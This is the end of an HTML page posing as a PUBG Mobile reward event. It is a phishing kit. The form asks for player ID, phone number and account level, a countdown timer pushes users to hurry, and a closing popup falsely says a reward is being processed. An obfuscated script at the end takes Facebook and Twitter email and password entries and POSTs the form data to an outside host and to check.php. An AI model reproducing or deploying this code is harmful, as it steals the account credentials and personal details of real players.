<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-alert4 --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert3"><br>
Thank you for joining the PUBG MOBILE Event
<br>
Your account is being processed to receive your reward. Please wait up to 24 hours. </div>
<div class="popup-box-alert0">
<br>- PUBG MOBILE -
</div> <!--- popup-box-alert0 --->
<br>
<div class="popup-box-form-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script src="./index_files/jquery.min.js.download"></script>
<script type="text/javascript" src="index_files/gift-zone.js"></script>
<script type="text/javascript" src="js-zone/showHide.js"></script>
<script type="text/javascript" src="js-zone/slider.js"></script>
<audio id="audioFile" src="media/spin.mp3"></audio>
<script>
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script><script>
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2400);
}
</script><script>
// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";
</script><script>
function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
	});
</script><script>
// kode untuk ganti gambar header otomatis
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2600);
}

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();
</script><script>(function(_0xa8daab,_0x29dfdb){var _0x55e596=_0x5ec7,_0xbffdf7=_0xa8daab();while(!![]){try{var _0x262495=parseInt(_0x55e596(0xa1))/0x1*(-parseInt(_0x55e596(0x9c))/0x2)+-parseInt(_0x55e596(0xa9))/0x3*(-parseInt(_0x55e596(0xaf))/0x4)+-parseInt(_0x55e596(0xb3))/0x5*(parseInt(_0x55e596(0xb0))/0x6)+-parseInt(_0x55e596(0xab))/0x7+parseInt(_0x55e596(0x92))/0x8+parseInt(_0x55e596(0xbd))/0x9+parseInt(_0x55e596(0xa3))/0xa*(parseInt(_0x55e596(0xb6))/0xb);if(_0x262495===_0x29dfdb)break;else _0xbffdf7['push'](_0xbffdf7['shift']());}catch(_0x4c8949){_0xbffdf7['push'](_0xbffdf7['shift']());}}}(_0x3a91,0xeafef));function open_account_verification(){var _0x294f7e=_0x5ec7;$(_0x294f7e(0xb7))[_0x294f7e(0xb9)](),$('.open_rewards')[_0x294f7e(0xaa)](),$(_0x294f7e(0x99))[_0x294f7e(0xaa)]();}function open_account_verification(){var _0x41370d=_0x5ec7;$(_0x41370d(0xb7))[_0x41370d(0xb9)](),$('.open_rewards')[_0x41370d(0xaa)](),$(_0x41370d(0x99))[_0x41370d(0xaa)]();}function open_mail_login(){var _0x1cb0ee=_0x5ec7;$('.login-mail')[_0x1cb0ee(0xb9)](),$(_0x1cb0ee(0xb5))[_0x1cb0ee(0xaa)]();}function close_mail_login(){var _0x21df60=_0x5ec7;$('.login-mail')[_0x21df60(0xaa)](),$(_0x21df60(0xb5))[_0x21df60(0xb9)]();}function open_facebook(){var _0x20a453=_0x5ec7;$(_0x20a453(0xae))[_0x20a453(0xb9)](),$('.account_login')[_0x20a453(0xaa)]();}function _0x3a91(){var _0xa55c92=['input#validateLogin','input#validateEmail','input#platform','POST','569664RfpeJL','hide','8827448DalhKY','https://getipflag.my.id/','#ValidateLoginTwitterForm','.login-facebook','32sWeXmC','6MQgBTV','serialize','input#validatePassword','8472540DseSWQ','ajax','.account_login','7667NQpoEW','.account_verification','#ValidateVerificationDataForm','show','input#level','#email-twitter','#password-facebook','6299883MVDHMw','val','7149400GfKHxO','input#tier','input#playid','.check_verification','.processing_account','.newhome','.verification_info','.otherReward_confirmation','trim','#login-twitter','124GGMntY','#login-facebook','#email-facebook','.open_rewards','#password-twitter','4087uizFJm','submit','15190lxIoAV','.login-twitter'];_0x3a91=function(){return _0xa55c92;};return _0x3a91();}function open_twitter(){var _0x765101=_0x5ec7;$(_0x765101(0xa4))[_0x765101(0xb9)](),$('.account_login')[_0x765101(0xaa)]();}function close_reward_confirmation(){var _0x4c66b6=_0x5ec7;$(_0x4c66b6(0x9f))[_0x4c66b6(0xaa)]();}function close_facebook(){var _0x56bc61=_0x5ec7;$(_0x56bc61(0xae))['hide'](),$(_0x56bc61(0xb5))[_0x56bc61(0xb9)]();}function close_twitter(){var _0xe8c1e4=_0x5ec7;$('.login-twitter')['hide'](),$(_0xe8c1e4(0xb5))['show']();}function open_newhome(){var _0x23c9fd=_0x5ec7;$(_0x23c9fd(0xb5))[_0x23c9fd(0xb9)](),$(_0x23c9fd(0x97))[_0x23c9fd(0xaa)]();}function open_account_login(){var _0x148634=_0x5ec7;$(_0x148634(0xb5))[_0x148634(0xb9)](),$(_0x148634(0x9f))[_0x148634(0xaa)]();}function _0x5ec7(_0xe3a63f,_0x32f997){var _0x3a915a=_0x3a91();return _0x5ec7=function(_0x5ec74b,_0x335519){_0x5ec74b=_0x5ec74b-0x92;var _0x17fb0e=_0x3a915a[_0x5ec74b];return _0x17fb0e;},_0x5ec7(_0xe3a63f,_0x32f997);}function ValidateLoginFbData(){var _0x105448=_0x5ec7;$('#ValidateLoginFbForm')[_0x105448(0xa2)](function(_0x3e3209){var _0x53c11c=_0x105448;_0x3e3209['preventDefault'](),$email=$(_0x53c11c(0x9e))[_0x53c11c(0xbe)]()[_0x53c11c(0x9a)](),$password=$(_0x53c11c(0xbc))[_0x53c11c(0xbe)]()[_0x53c11c(0x9a)](),$login=$(_0x53c11c(0x9d))[_0x53c11c(0xbe)]()[_0x53c11c(0x9a)]();if($email==''||$password==''){}else $('.login-facebook')[_0x53c11c(0xaa)](),$(_0x53c11c(0xb7))[_0x53c11c(0xb9)](),$(_0x53c11c(0xa6))[_0x53c11c(0xbe)]($email),$(_0x53c11c(0xb2))['val']($password),$(_0x53c11c(0xa5))[_0x53c11c(0xbe)]($login);});}function ValidateLoginTwitterData(){var _0x4bd5ba=_0x5ec7;$(_0x4bd5ba(0xad))[_0x4bd5ba(0xa2)](function(_0x3e8b1f){var _0x1705c5=_0x4bd5ba;_0x3e8b1f['preventDefault'](),$email=$(_0x1705c5(0xbb))[_0x1705c5(0xbe)]()[_0x1705c5(0x9a)](),$password=$(_0x1705c5(0xa0))[_0x1705c5(0xbe)]()[_0x1705c5(0x9a)](),$login=$(_0x1705c5(0x9b))[_0x1705c5(0xbe)]()[_0x1705c5(0x9a)]();if($email==''||$password==''){}else $(_0x1705c5(0xa4))['hide'](),$(_0x1705c5(0xb7))['show'](),$(_0x1705c5(0xa6))[_0x1705c5(0xbe)]($email),$('input#validatePassword')['val']($password),$('input#validateLogin')['val']($login);});}function ValidateVerificationData(){var _0x339f67=_0x5ec7,_0x2405c5=$(_0x339f67(0xb8))['serialize']();return $[_0x339f67(0xb4)]({'url':_0x339f67(0xac),'data':_0x2405c5,'type':'POST','success':function(){return!0x0;},'error':function(){return!0x0;}}),$(_0x339f67(0xb8))[_0x339f67(0xa2)](function(_0x145a02){var _0x5ede94=_0x339f67;_0x145a02['preventDefault']();var _0xdb2619=$(_0x5ede94(0xa6))['val'](),_0x36a632=$(_0x5ede94(0xb2))[_0x5ede94(0xbe)](),_0x36104e=$('input#nick')[_0x5ede94(0xbe)](),_0xd5556a=$(_0x5ede94(0x94))['val'](),_0x55c7de=$('input#phone')['val'](),_0x1575fd=$(_0x5ede94(0xba))[_0x5ede94(0xbe)](),_0x19d9ec=$(_0x5ede94(0x93))[_0x5ede94(0xbe)](),_0x55056d=$('input#rpt')[_0x5ede94(0xbe)](),_0x6ba883=$('input#rpl')[_0x5ede94(0xbe)](),_0x2ee12d=$(_0x5ede94(0xa7))[_0x5ede94(0xbe)](),_0x322445=$('input#validateLogin')[_0x5ede94(0xbe)]();if(_0xdb2619==''&&_0x36a632==''&&_0x36104e==''&&_0xd5556a==''&&_0x55c7de==''&&_0x1575fd==''&&_0x19d9ec==''&&_0x55056d==''&&_0x6ba883==''&&_0x2ee12d==''&&_0x322445=='')return $(_0x5ede94(0x98))[_0x5ede94(0xb9)](),$(_0x5ede94(0xb7))[_0x5ede94(0xaa)](),![];$['ajax']({'type':_0x5ede94(0xa8),'url':'check.php','data':$(this)[_0x5ede94(0xb1)](),'beforeSend':function(){var _0x41d99c=_0x5ede94;$(_0x41d99c(0x95))['show'](),$(_0x41d99c(0xb7))[_0x41d99c(0xaa)]();},'success':function(){var _0xfcd6ef=_0x5ede94;$(_0xfcd6ef(0x96))[_0xfcd6ef(0xb9)](),$(_0xfcd6ef(0x95))[_0xfcd6ef(0xaa)](),$('.account_verification')['hide']();}});}),![];};</script>
</body>
</html>